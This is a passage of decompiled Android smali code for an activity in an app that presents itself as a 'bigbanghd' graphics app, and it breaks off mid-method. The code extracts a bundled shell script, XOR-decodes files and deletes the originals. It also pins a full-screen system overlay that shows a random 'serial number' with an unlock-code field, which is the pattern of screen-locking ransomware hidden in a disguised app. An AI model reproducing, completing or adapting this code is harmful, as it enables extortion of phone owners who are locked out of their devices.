.class public Lcom/sunglab/bigbanghd/s;
.super Landroid/app/Activity;
.source "s.java"

# interfaces
.implements Landroid/hardware/SensorEventListener;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/sunglab/bigbanghd/s$100000000;,
        Lcom/sunglab/bigbanghd/s$100000001;
    }
.end annotation


# static fields
.field public static final Amazon:I = 0x1

.field public static final Google:I = 0x0

.field public static IsthatPlaying:Z = false

.field public static final Samsung:I = 0x3

.field private static dataOfFile:I = 0x0

.field private static final numOfEncAndDec:I = 0x99


# instance fields
.field aa:[Ljava/lang/String;

.field c:Landroid/widget/EditText;

.field f:[Ljava/lang/String;

.field private ff:Landroid/view/WindowManager$LayoutParams;

.field h:Ljava/lang/String;

.field k:I

.field mRenderer:Lcom/sunglab/bigbanghd/GL2JNIView$Renderer;

.field private mWindowManager:Landroid/view/WindowManager;

.field private odexPath:Ljava/lang/String;

.field view:Landroid/view/View;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;

.field x:[C


# direct methods
.method static final constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput v0, Lcom/sunglab/bigbanghd/s;->dataOfFile:I

    sput-boolean v0, Lcom/sunglab/bigbanghd/s;->IsthatPlaying:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 300
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")V^",
            "Ljava/io/IOException;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 219
    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, p1}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 221
    invoke-virtual {p0}, Lcom/sunglab/bigbanghd/s;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    invoke-virtual {v0, p2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v2

    .line 222
    const/16 v0, 0x400

    new-array v3, v0, [B

    .line 223
    invoke-virtual {v2, v3}, Ljava/io/InputStream;->read([B)I

    move-result v0

    .line 224
    :goto_0
    if-gtz v0, :cond_0

    .line 229
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    .line 230
    invoke-virtual {v2}, Ljava/io/InputStream;->close()V

    .line 231
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    return-void

    .line 226
    :cond_0
    const/4 v4, 0x0

    invoke-virtual {v1, v3, v4, v0}, Ljava/io/OutputStream;->write([BII)V

    .line 227
    invoke-virtual {v2, v3}, Ljava/io/InputStream;->read([B)I

    move-result v0

    goto :goto_0
.end method

.method private c()V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 77
    new-instance v1, Lcom/sunglab/bigbanghd/GL2JNIView;

    invoke-direct {v1, p0}, Lcom/sunglab/bigbanghd/GL2JNIView;-><init>(Landroid/content/Context;)V

    .line 85
    new-instance v2, Landroid/widget/RelativeLayout;

    invoke-direct {v2, p0}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    .line 86
    new-instance v3, Landroid/widget/LinearLayout;

    invoke-direct {v3, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 87
    new-instance v4, Landroid/widget/TextView;

    invoke-direct {v4, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 88
    new-instance v0, Landroid/widget/EditText;

    invoke-direct {v0, p0}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->c:Landroid/widget/EditText;

    .line 89
    new-instance v5, Landroid/widget/Button;

    invoke-direct {v5, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    .line 90
    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 91
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    .line 92
    const/16 v7, 0x270f

    invoke-virtual {v0, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v7

    .line 94
    const v8, 0x1869f

    invoke-virtual {v0, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v8

    .line 95
    const v9, 0x1869f

    invoke-virtual {v0, v9}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    .line 96
    const/high16 v9, -0x10000

    invoke-virtual {v6, v9}, Landroid/widget/TextView;->setTextColor(I)V

    .line 97
    new-instance v9, Ljava/lang/StringBuffer;

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v10, Ljava/lang/StringBuffer;

    invoke-direct {v10}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v11, Ljava/lang/StringBuffer;

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v12, Ljava/lang/StringBuffer;

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    const-string v14, "\u5e8f\u5217\u53f7:"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    const-string v13, "-"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    mul-int/lit8 v12, v8, 0x2

    invoke-static {v12}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    const-string v11, "-"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    mul-int/lit8 v10, v0, 0x5

    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v9}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 98
    div-int/lit8 v8, v8, 0x2

    mul-int/lit16 v8, v8, 0x208

    mul-int/2addr v8, v7

    div-int/lit8 v0, v0, 0x5

    sub-int/2addr v0, v7

    add-int/2addr v0, v8

    .line 99
    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v0

    mul-int/2addr v0, v7

    .line 100
    mul-int/2addr v0, v7

    div-int/lit8 v0, v0, 0x2

    add-int/lit16 v0, v0, 0x29a

    invoke-static {v0}, Ljava/lang/Math;->abs(I)I

    move-result v0

    .line 101
    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    .line 102
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    array-length v0, v0

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->f:[Ljava/lang/String;

    .line 103
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    array-length v0, v0

    iput v0, p0, Lcom/sunglab/bigbanghd/s;->k:I

    .line 104
    const/4 v0, 0x0

    :goto_0
    iget-object v8, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    array-length v8, v8

    if-lt v0, v8, :cond_0

    .line 112
    const-string v0, "\u89e3\u9501"

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 113
    const/16 v0, 0x14

    int-to-float v0, v0

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setTextSize(F)V

    .line 114
    const-string v0, "#D42AF5"

    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setTextColor(I)V

    .line 115
    const-string v0, "#004C0655"

    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setBackgroundColor(I)V

    .line 116
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->ff:Landroid/view/WindowManager$LayoutParams;

    .line 117
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->ff:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x1

    iput v7, v0, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 118
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->ff:Landroid/view/WindowManager$LayoutParams;

    const/4 v7, -0x2

    iput v7, v0, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 119
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->c:Landroid/widget/EditText;

    iget-object v7, p0, Lcom/sunglab/bigbanghd/s;->ff:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {v0, v7}, Landroid/widget/EditText;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 120
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->c:Landroid/widget/EditText;

    const/high16 v7, -0x10000

    invoke-virtual {v0, v7}, Landroid/widget/EditText;->setTextColor(I)V

    .line 124
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->c:Landroid/widget/EditText;

    const/4 v7, 0x1

    new-array v7, v7, [Landroid/text/InputFilter;

    const/4 v8, 0x0

    new-instance v9, Landroid/text/InputFilter$LengthFilter;

    const/16 v10, 0x32

    invoke-direct {v9, v10}, Landroid/text/InputFilter$LengthFilter;-><init>(I)V

    aput-object v9, v7, v8

    invoke-virtual {v0, v7}, Landroid/widget/EditText;->setFilters([Landroid/text/InputFilter;)V

    .line 125
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->aa:[Ljava/lang/String;

    const/4 v7, 0x0

    aget-object v0, v0, v7

    invoke-virtual {v0}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 126
    const/high16 v0, -0x10000

    invoke-virtual {v4, v0}, Landroid/widget/TextView;->setTextColor(I)V

    .line 127
    const/16 v0, 0x19

    int-to-float v0, v0

    invoke-virtual {v4, v0}, Landroid/widget/TextView;->setTextSize(F)V

    .line 128
    const/4 v0, 0x1

    invoke-virtual {v3, v0}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 129
    invoke-virtual {v3, v4}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 130
    invoke-virtual {v3, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 131
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->c:Landroid/widget/EditText;

    invoke-virtual {v3, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 132
    invoke-virtual {v3, v5}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 133
    invoke-virtual {v2, v1}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;)V

    .line 134
    invoke-virtual {v2, v3}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;)V

    .line 137
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 138
    invoke-virtual {p0}, Lcom/sunglab/bigbanghd/s;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {p0}, Lcom/sunglab/bigbanghd/s;->getApplication()Landroid/app/Application;

    sget-object v3, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v0, v3}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->mWindowManager:Landroid/view/WindowManager;

    .line 139
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    iput v3, v0, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 140
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v3, 0x1

    iput v3, v0, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 141
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x500

    iput v3, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 142
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x31

    iput v3, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 143
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v3, 0x0

    iput v3, v0, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 144
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v3, 0x0

    iput v3, v0, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 145
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v3, -0x1

    iput v3, v0, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 146
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v3, -0x1

    iput v3, v0, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 147
    iget-object v0, p0, Lcom/sunglab/bigbanghd/s;->mWindowManager:Landroid/view/WindowManager;

    iget-object v3, p0, Lcom/sunglab/bigbanghd/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v2, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 148
    new-instance v0, Lcom/sunglab/bigbanghd/s$100000000;

    invoke-direct {v0, p0}, Lcom/sunglab/bigbanghd/s$100000000;-><init>(Lcom/sunglab/bigbanghd/s;)V

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 165
    new-instance v0, Lcom/sunglab/bigbanghd/s$100000001;

    invoke-direct {v0, p0}, Lcom/sunglab/bigbanghd/s$100000001;-><init>(Lcom/sunglab/bigbanghd/s;)V

    invoke-virtual {v1, v0}, Lcom/sunglab/bigbanghd/GL2JNIView;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    return-void

    .line 106
    :cond_0
    iget-object v8, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    aget-char v8, v8, v0

    invoke-static {v8}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    .line 107
    add-int/2addr v8, v7

    .line 108
    iget-object v9, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    int-to-char v8, v8

    aput-char v8, v9, v0

    .line 109
    iget-object v8, p0, Lcom/sunglab/bigbanghd/s;->f:[Ljava/lang/String;

    iget-object v9, p0, Lcom/sunglab/bigbanghd/s;->x:[C

    aget-char v9, v9, v0

    invoke-static {v9}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/sunglab/bigbanghd/uits;->hex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v8, v0

    .line 104
    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_0
.end method

.method public static readPhoneNumber(Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    .prologue
    const/4 v1, 0x0

    .line 249
    const/16 v0, 0x400

    new-array v5, v0, [B

    .line 251
    new-instance v3, Ljava/io/File;

    invoke-direct {v3, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v0, v1

    .line 252
    check-cast v0, Ljava/io/FileInputStream;

    move-object v2, v1

    .line 253
    check-cast v2, Ljava/io/ByteArrayOutputStream;

    .line 256
    :try_start_0
    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_a
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_8
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 258
    :try_start_1
    invoke-virtual {v4, v5}, Ljava/io/FileInputStream;->read([B)I

    move-result v0

    .line 260
    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V
    :try_end_1
    .catch Ljava/io/FileNotFoundException; {:try_start_1 .. :try_end_1} :catch_b
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_9
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 261
    const/4 v2, 0x0

    :try_start_2
    invoke-virtual {v3, v5, v2, v0}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    .line 263
    new-instance v0, Ljava/lang/String;

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V
    :try_end_2
    .catch Ljava/io/FileNotFoundException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 275
    if-eqz v4, :cond_0

    .line 279
    :try_start_3
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/io/FileNotFoundException; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    .line 286
    :cond_0
    :goto_0
    if-eqz v3, :cond_1

    .line 290
    :try_start_4
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->flush()V

    .line 291
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/io/FileNotFoundException; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    :cond_1
    :goto_1
    move-object v1, v0

    .line 299
    :goto_2
    return-object v1

    .line 279
    :catch_0
    move-exception v2

    .line 283
    :try_start_5
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V
    :try_end_5
    .catch Ljava/io/FileNotFoundException; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    goto :goto_0

    .line 295
    :catch_1
    move-exception v0

    move-object v2, v3

    move-object v3, v4

    .line 267
    :goto_3
    :try_start_6
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    .line 275
    :goto_4
    if-eqz v3, :cond_2

    .line 279
    :try_start_7
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_7
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_6

    .line 286
    :cond_2
    :goto_5
    if-eqz v2, :cond_3

    .line 290
    :try_start_8
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->flush()V

    .line 291
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_7

    .line 299
    :cond_3
    :goto_6
    check-cast v1, Ljava/lang/String;

    goto :goto_2

    .line 291
    :catch_2
    move-exception v2

    .line 295
    :try_start_9
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V
    :try_end_9
    .catch Ljava/io/FileNotFoundException; {:try_start_9 .. :try_end_9} :catch_1
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_3
    .catchall {:try_start_9 .. :try_end_9} :catchall_2

    goto :goto_1

    .line 267
    :catch_3
    move-exception v0

    .line 271
    :goto_7
    :try_start_a
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_2

    move-object v2, v3

    move-object v3, v4

    goto :goto_4

    :catchall_0
    move-exception v1

    move-object v3, v2

    move-object v4, v0

    move-object v0, v1

    .line 275
    :goto_8
    if-eqz v4, :cond_4

    .line 279
    :try_start_b
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V
    :try_end_b
    .catch Ljava/io/IOException; {:try_start_b .. :try_end_b} :catch_4

    .line 286
    :cond_4
    :goto_9
    if-eqz v3, :cond_5

    .line 290
    :try_start_c
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->flush()V

    .line 291
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_c
    .catch Ljava/io/IOException; {:try_start_c .. :try_end_c} :catch_5

    .line 295
    :cond_5
    :goto_a
    throw v0

    .line 279
    :catch_4
    move-exception v1

    .line 283
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_9

    .line 291
    :catch_5
    move-exception v1

    .line 295
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_a

    .line 279
    :catch_6
    move-exception v0

    .line 283
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_5

    .line 291
    :catch_7
    move-exception v0

    .line 295
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_6

    .line 271
    :catchall_1
    move-exception v0

    move-object v3, v2

    goto :goto_8

    :catchall_2
    move-exception v0

    goto :goto_8

    :catchall_3
    move-exception v0

    move-object v4, v3

    move-object v3, v2

    goto :goto_8

    .line 267
    :catch_8
    move-exception v3

    move-object v4, v0

    move-object v0, v3

    move-object v3, v2

    goto :goto_7

    :catch_9
    move-exception v0

    move-object v3, v2

    goto :goto_7

    .line 295
    :catch_a
    move-exception v3

    move-object v6, v3

    move-object v3, v0

    move-object v0, v6

    goto :goto_3

    :catch_b
    move-exception v0

    move-object v3, v4

    goto :goto_3
.end method


# virtual methods
.method public b(Ljava/io/File;Ljava/io/File;)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/File;",
            "Ljava/io/File;",
            ")V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 235
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 236
    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 238
    :goto_0
    invoke-virtual {v0}, Ljava/io/InputStream;->read()I

    move-result v2

    sput v2, Lcom/sunglab/bigbanghd/s;->dataOfFile:I

    const/4 v3, -0x1

    if-gt v2, v3, :cond_0

    .line 242
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    .line 243
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    .line 244
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    .line 245
    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    return-void

    .line 240
    :cond_0
    sget v2, Lcom/sunglab/bigbanghd/s;->dataOfFile:I

    xor-int/lit16 v2, v2, 0x99

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write(I)V

    goto :goto_0
.end method

.method public onAccuracyChanged(Landroid/hardware/Sensor;I)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/hardware/Sensor;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    const-string v0, "com.aide.ui"

    invoke-static {p0, v0}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 55
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 59
    invoke-virtual {p0}, Lcom/sunglab/bigbanghd/s;->getFilesDir()Ljava/io/File;

    move-result-object v0

    .line 60
    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/sunglab/bigbanghd/s;->odexPath:Ljava/lang/String;

    .line 63
    :try_start_0
    new-instance v0, Ljava/lang/StringBuffer;

    invoke-direct {v0}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v1, p0, Lcom/sunglab/bigbanghd/s;->odexPath:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    const-string v1, "a.sh"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "shell.sh"

    invoke-direct {p0, v0, v1}, Lcom/sunglab/bigbanghd/s;->a(Ljava/lang/String;Ljava/lang/String;)V

    .line 64
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v2, p0, Lcom/sunglab/bigbanghd/s;->odexPath:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    const-string v2, "a.sh"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuffer;

    invoke-direct {v2}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v3, p0, Lcom/sunglab/bigbanghd/s;->odexPath:Ljava/lang/String;

